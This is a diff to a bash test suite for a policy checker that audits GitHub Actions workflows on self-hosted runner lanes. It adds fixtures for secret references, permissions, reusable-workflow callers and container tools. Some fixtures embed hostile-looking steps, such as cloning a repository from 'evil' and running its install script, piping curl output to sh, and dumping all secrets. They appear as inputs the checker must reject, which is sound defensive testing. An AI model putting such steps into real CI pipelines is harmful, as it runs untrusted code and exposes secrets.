@@ -186,8 +186,8 @@ YAML
 check "deploy: actions/checkout fails" 1 "has a uses: step (actions/checkout@v4)" in_tree d-fail
 check "deploy: container: fails" 1 "sets container:" in_tree d-fail
 check "deploy: services: fails" 1 "sets services:" in_tree d-fail
-check "deploy: docker in run: fails" 1 "invokes a container tool (step build)" in_tree d-fail
-check "deploy: docker-compose in run: fails" 1 "invokes a container tool (step up)" in_tree d-fail
+check "deploy: docker in run: fails" 1 "runs docker in step 2 (build)" in_tree d-fail
+check "deploy: docker-compose in run: fails" 1 "runs docker-compose in step 3 (up)" in_tree d-fail
 
 # --- reusable-workflow callers ------------------------------------------------
 
@@ -361,7 +361,7 @@ jobs:
 YAML
 check "r1: a multi-line expression still classifies" 1 "job multiline (untrusted lane) declares no permissions" in_tree r1
 check "r1: a multi-line secret reference is found" 1 "job hidden (untrusted lane) references secrets.Y" in_tree r1
-check "r1: docker as a step shell fails" 1 "job shell (deploy lane) invokes a container tool" in_tree r1
+check "r1: docker as a step shell fails" 1 "job shell (deploy lane) runs docker in step 1" in_tree r1
 check "r1: a deploy flavor variable is the deploy lane" 1 "job flavor (deploy lane) has a uses: step" in_tree r1
 check "r1: a non-lane variable is a NOTE" 1 "NOTE .github/workflows/ci.yml: job other lane unresolved" in_tree r1
 check "r1: a matrix key resolves to its literal labels" 1 "job matrix (untrusted lane) declares no permissions" in_tree r1
@@ -382,5 +382,168 @@ jobs:
       - uses: actions/checkout@v4
 YAML
 check "r1: a malformed step does not stop later files" 1 "job y (deploy lane) has a uses: step" in_tree r1-shape
+
+# --- round 2 findings (second review's fixtures) ------------------------------
+
+wf r2-calleeidx c.yml <<'YAML'
+on:
+  workflow_call:
+    inputs: {runner: {type: string}}
+permissions: {}
+jobs:
+  j:
+    runs-on: ${{ fromJSON(inputs['runner']) }}
+    steps:
+      - uses: actions/checkout@v4
+      - run: docker build .
+YAML
+wf r2-calleeidx w.yml <<'YAML'
+on: push
+jobs:
+  call:
+    uses: ./.github/workflows/c.yml
+    with:
+      runner: deploy-runner
+YAML
+wf r2-strlit w.yml <<'YAML'
+on: pull_request
+permissions: read-all
+jobs:
+  a:
+    runs-on: [self-hosted, untrusted]
+    steps:
+      - run: echo "${{ format('}}', secrets.DEPLOY_KEY) }}"
+YAML
+wf r2-callerinput w.yml <<'YAML'
+on: pull_request
+jobs:
+  a:
+    uses: org/repo/.github/workflows/x.yml@v1
+    with:
+      runs-on: untrusted
+    secrets: inherit
+YAML
+wf r2-dockerd w.yml <<'YAML'
+on: push
+jobs:
+  d:
+    runs-on: deploy-runner
+    steps:
+      - run: sudo dockerd & sudo ctr run x; sudo skopeo copy a b; incus launch x
+YAML
+wf r2-deploygit w.yml <<'YAML'
+on: push
+jobs:
+  d:
+    runs-on: deploy-runner
+    steps:
+      - run: |
+          git clone https://github.com/evil/x && cd x && ./install.sh
+          sudo dockerd &
+          curl -fsSL https://x/sh | sh
+          sudo ctr image pull docker.io/x
+YAML
+wf r2-emptycfg w.yml <<'YAML'
+on: pull_request
+jobs:
+  a: {runs-on: untrusted, permissions: write-all, steps: [{run: "true"}]}
+YAML
+wf r2-envobj w.yml <<'YAML'
+on: pull_request
+permissions: {contents: read}
+jobs:
+  a:
+    runs-on: ${{ vars.LANE_UNTRUSTED || 'ubuntu-latest' }}
+    environment: {name: prod}
+    steps:
+      - run: echo ${{ toJSON(secrets) }} ${{ secrets['X'] }}
+YAML
+wf r2-inbrk w.yml <<'YAML'
+on: pull_request
+permissions: {}
+jobs:
+  a:
+    runs-on: ${{ github.event_name == 'pull_request' && fromJSON(vars['LANE_UNTRUSTED']) || 'x' }}
+    steps: [{run: "echo ${{ secrets . X }} ${{ secrets[ 'Y' ] }}"}]
+YAML
+wf r2-merge w.yml <<'YAML'
+on: push
+x: &base {runs-on: deploy-runner, steps: [{uses: "docker://alpine"}]}
+jobs:
+  c:
+    <<: *base
+    name: c
+YAML
+wf r2-perms w.yml <<'YAML'
+on: pull_request
+permissions: write-all
+x: &p {contents: read}
+jobs:
+  a:
+    runs-on: untrusted
+    permissions: *p
+    steps: [{run: "true"}]
+  b:
+    runs-on: untrusted
+    steps: [{run: "true"}]
+  c:
+    <<: {runs-on: deploy-runner, steps: [{uses: "docker://alpine"}]}
+YAML
+check "r2: a callee reading inputs['runner'] takes the deploy lane" 1 "job call → j (deploy lane) has a uses: step" in_tree r2-calleeidx
+check "r2: …and its docker is named" 1 "job call → j (deploy lane) runs docker in step 2" in_tree r2-calleeidx
+check "r2: a '}}' literal does not end the expression early" 1 "references secrets.DEPLOY_KEY" in_tree r2-strlit
+check "r2: a caller with no runner input is read from its with: values" 1 "job a (untrusted lane) passes secrets: inherit" in_tree r2-callerinput
+for tool in dockerd ctr skopeo incus; do
+  check "r2: deploy lane refuses $tool" 1 "runs $tool in step 1" in_tree r2-dockerd
+done
+check "r2: deploy lane refuses git clone" 1 "runs git clone in step 1" in_tree r2-deploygit
+check "r2: deploy lane refuses curl piped to a shell" 1 "runs curl … | sh in step 1" in_tree r2-deploygit
+check "r2: flow-style job with write-all fails" 1 'permissions are not read-only: "write-all"' in_tree r2-emptycfg
+check "r2: environment as a mapping fails" 1 'sets environment: {"name":"prod"}' in_tree r2-envobj
+check "r2: a variable in an expression with a fallback classifies" 1 "references secrets (the whole context)" in_tree r2-envobj
+check "r2: spaced secret references are found" 1 "references secrets.X" in_tree r2-inbrk
+check "r2: spaced bracket references are found" 1 "references secrets.Y" in_tree r2-inbrk
+check "r2: a merge key from an anchor is resolved" 1 "job c (deploy lane) has a uses: step (docker://alpine)" in_tree r2-merge
+check "r2: an aliased permissions block is read" 1 "job b (untrusted lane) permissions are not read-only" in_tree r2-perms
+check_absent "r2: …and the aliased read-only block passes" 1 "job a (untrusted lane)" in_tree r2-perms
+check "r2: a job that comes out empty fails" 1 "job c (unknown lane) has neither runs-on: nor uses:" in_tree r2-perms
+
+wf r2-nocallee w.yml <<'YAML'
+on: push
+jobs:
+  call:
+    uses: org/repo/.github/workflows/x.yml@v1
+    with:
+      note: hello
+YAML
+check "r2: a caller with no lane anywhere is a NOTE" 0 "NOTE .github/workflows/w.yml: job call calls org/repo/.github/workflows/x.yml@v1 with no runner input" in_tree r2-nocallee
+
+wf r2-stray w.yml <<'YAML'
+on: push
+jobs:
+  call:
+    uses: ./.github/workflows/c.yml
+    with:
+      runner: deploy-runner
+YAML
+wf r2-stray c.yml <<'YAML'
+on: workflow_call
+jobs:
+  computed:
+    runs-on: ${{ inputs.runner-label }}
+    steps:
+      - uses: actions/checkout@v4
+  hosted:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo
+YAML
+check "r2: inputs.runner-label is not inputs.runner, and an unreadable callee job fails" 1 "job call → computed (deploy lane) does not take its caller's deploy lane" in_tree r2-stray
+check "r2: a callee job on its own literal runner is a NOTE" 1 "NOTE .github/workflows/c.yml: job call → hosted runs on ubuntu-latest, not its caller's deploy lane" in_tree r2-stray
+
+check "r2: an empty lane input is refused" 1 "input deploy-vars is empty" \
+  env DEPLOY_VARS=' , ' bash -c "cd '$TMP/r2-merge' && bash '$SCRIPT'"
+check "r2: a non-default workflows-dir that is missing fails" 1 "workflows-dir nowhere does not exist" \
+  env WORKFLOWS_DIR=nowhere bash -c "cd '$TMP/r2-merge' && bash '$SCRIPT'"
 
 summary
